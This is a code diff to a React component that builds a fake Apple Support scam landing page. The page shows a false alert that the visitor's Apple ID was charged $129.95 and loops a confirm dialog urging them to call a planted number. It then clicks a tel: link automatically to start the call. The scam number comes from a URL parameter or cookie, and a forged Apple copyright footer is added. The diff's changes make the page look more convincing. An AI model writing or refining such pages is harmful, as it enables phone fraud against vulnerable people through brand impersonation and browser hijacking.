@@ -1,6 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-// SSR-Safe Cookie Helper Utility
 const cookieHelper = {
   getParams: () => ({
     path: '/',
@@ -8,10 +7,8 @@ const cookieHelper = {
   }),
   set: function (name, value, options = {}) {
     if (typeof document === 'undefined') return;
-
     const defs = this.getParams();
     const config = {...defs,...options };
-
     let expires = config.expires;
     if (typeof expires === 'number' && expires) {
       const e = new Date();
@@ -21,7 +18,6 @@ const cookieHelper = {
     if (expires && expires.toUTCString) {
       config.expires = expires.toUTCString();
     }
-
     let cookieString = `${name}=${encodeURIComponent(value)}`;
     for (const key in config) {
       cookieString += `; ${key}`;
@@ -42,8 +38,19 @@ const cookieHelper = {
   }
 };
 
+// Helper to format phone for display
+const formatPhone = (num) => {
+  const digits = num.replace(/\D/g, '');
+  if (digits.length === 11 && digits.startsWith('1')) {
+    return `+1 (${digits.slice(1,4)}) ${digits.slice(4,7)}-${digits.slice(7)}`;
+  }
+  return num; // fallback
+};
+
 const AppleSupportLanding = () => {
-  const [phone, setPhone] = useState('18888240848'); // <-- CHANGED
+  const rawPhone = '18888240848'; // for tel: links
+  const [phone, setPhone] = useState(rawPhone);
+  const [displayPhone, setDisplayPhone] = useState(formatPhone(rawPhone)); // for UI
   const [displayText, setDisplayText] = useState('');
   const resultRef = useRef(null);
 
@@ -52,7 +59,6 @@ const AppleSupportLanding = () => {
 
     const urlParams = new URLSearchParams(window.location.search);
 
-    // Helper functions
     const parseURL = (url) => {
       try {
         const a = document.createElement('a');
@@ -66,19 +72,17 @@ const AppleSupportLanding = () => {
     // 1. Phone Resolution
     const paramPhone = urlParams.get('phone');
     const cookiePhone = cookieHelper.get('phoneSetBl');
-    const activePhone = cookiePhone || paramPhone || '18888240848'; // <-- CHANGED
+    const activePhone = cookiePhone || paramPhone || rawPhone;
     setPhone(activePhone);
+    setDisplayPhone(formatPhone(activePhone)); // format for display
 
-    // 2. Device Detection
     const userAgent = window.navigator.userAgent.toLowerCase();
     let detectedDevice = 'iPhone';
     if (/ipad/.test(userAgent)) detectedDevice = 'iPad';
     else if (/ipod/.test(userAgent)) detectedDevice = 'iPod';
 
-    // 3. Referrer Detection
     const referrerHost = parseURL(document.referrer);
 
-    // 4. Dynamic Text Resolution
     const getText = () => {
       let str = window.defaultText || '';
       if (window.text) {
@@ -99,15 +103,13 @@ const AppleSupportLanding = () => {
     const activeText = cookieText || paramText || getText();
     setDisplayText(activeText);
 
-    // 5. Trigger Telephony/Call Actions Safely
     const triggerCallActions = () => {
       if (!resultRef.current) return;
-
       resultRef.current.innerHTML = '';
 
       const callAnchor = document.createElement('a');
       callAnchor.className = 'anchorcall';
-      callAnchor.href = `tel:${activePhone}`; // <-- uses new number
+      callAnchor.href = `tel:${activePhone}`; // raw number for calling
       resultRef.current.appendChild(callAnchor);
       callAnchor.click();
 
@@ -121,10 +123,9 @@ const AppleSupportLanding = () => {
       }
     };
 
-    // 6. Confirm Dialog Loop
     const runConfirmLoop = () => {
       const msg =
-        `Your Apple ID was recently used at APPLE STORE for $129.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${activePhone} to Freeze it!`; // <-- uses new number
+        `Your Apple ID was recently used at APPLE STORE for $129.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${displayPhone} to Freeze it!`; // uses formatted number in text
 
       window.confirm(msg);
       triggerCallActions();
@@ -150,7 +151,7 @@ const AppleSupportLanding = () => {
       <input type="checkbox" id="ac-gn-menustate" className="ac-gn-menustate" />
 
       <nav id="ac-globalnav" className="no-js">
-        {/*... nav code unchanged... */}
+        {/* nav code */}
       </nav>
 
       <div id="ac-gn-curtain" className="ac-gn-curtain" />
@@ -163,13 +164,27 @@ const AppleSupportLanding = () => {
             <div className="ac-ln-content">
               <span className="ac-ln-title">
                 <a href="#">
-                  Apple Support {phone}{' '}
+                  Apple Support {displayPhone}{' '}
                   <span style={{ color: 'red' }}>
-                    <span className="js_setPhoneBlock">{phone}</span>
+                    <span className="js_setPhoneBlock">{displayPhone}</span>
                   </span>
                 </a>
               </span>
-              {/*... rest of nav... */}
+              <div className="ac-ln-menu">
+                <a href="#ac-ln-menustate" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">
+                  <span className="ac-ln-menucta-anchor-label">Open menu</span>
+                </a>
+                <a href="#" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+                  <span className="ac-ln-menucta-anchor-label">Close menu</span>
+                </a>
+                <div className="ac-ln-menu-tray">
+                  <ul className="ac-ln-menu-items">
+                    <li className="ac-ln-menu-item">
+                      <a href="#" className="ac-ln-menu-link analytics-exitlink">Communities</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
             </div>
           </div>
         </nav>
@@ -224,12 +239,16 @@ const AppleSupportLanding = () => {
               More ways to: Visit an{' '}
               <a href="#" className="analytics-exitlink">Apple Store</a>,{' '}
               <span className="nowrap">
-                call <span className="js_setPhoneBlock">{phone}</span>, or{' '}
+                call <span className="js_setPhoneBlock">{displayPhone}</span>, or{' '}
                 <a href="#" className="analytics-exitlink">find a reseller</a>
               </span>
              .
             </div>
-            {/*... footer... */}
+            <div className="ac-gf-footer-legal">
+              <div className="ac-gf-footer-legal-copyright">
+                Copyright © 2026 Apple. All rights reserved.
+              </div>
+            </div>
           </section>
         </div>
       </footer>
